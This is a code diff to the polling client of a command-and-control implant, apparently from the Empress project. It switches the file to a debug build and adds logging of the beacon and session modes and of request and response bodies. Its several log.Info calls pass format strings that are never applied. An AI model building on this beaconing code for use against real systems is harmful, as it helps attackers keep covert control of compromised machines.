@@ -1,4 +1,4 @@
-//go:build !debug
+//go:build debug
 
 package c2
 
@@ -8,6 +8,7 @@ import (
 	"errors"
 	"github.com/pygrum/Empress/config"
 	"github.com/pygrum/Empress/transport"
+	log "github.com/sirupsen/logrus"
 	"io"
 	"math/rand"
 	"net/http"
@@ -21,6 +22,7 @@ import (
 func (c *Client) Poll() (*transport.Registration, error) {
 	switch config.C.Mode {
 	case config.ModeSession:
+		log.Info("mode SESSION: long polling")
 		// long polling mode - we send a response as soon as it's ready
 		for {
 			reg, err := c.poll()
@@ -29,6 +31,7 @@ func (c *Client) Poll() (*transport.Registration, error) {
 			}
 		}
 	case config.ModeBeacon:
+		log.Info("mode BEACON: simple polling")
 		// beacon mode, we send responses in intervals
 		tickSalt := config.C.BeaconSalt
 
@@ -59,6 +62,7 @@ func (c *Client) poll() (*transport.Registration, error) {
 		if err != nil {
 			return emptyReg, err
 		}
+		log.Info("sending body: %s", data)
 		body = bytes.NewReader(data)
 	}
 	req, err := http.NewRequest(http.MethodGet, c.Address, body)
@@ -74,6 +78,7 @@ func (c *Client) poll() (*transport.Registration, error) {
 			return Registration(c.Response()), err
 		}
 	}
+	log.Info("sent request: %v", req)
 	if resp.StatusCode != http.StatusOK {
 		// could be unauthorised, must re-register
 		reg := Registration(c.Response())
@@ -82,6 +87,7 @@ func (c *Client) poll() (*transport.Registration, error) {
 	// TODO: Process c2 req (resp) using the router. Also, check out how much work it is to integrate with mythic
 	// TODO: from a code perspective, compared to this :)
 	taskReq := &transport.Request{}
+	log.Info("received response body: %v", resp.Body)
 	if err = json.NewDecoder(resp.Body).Decode(taskReq); err != nil {
 		return emptyReg, err
 	}
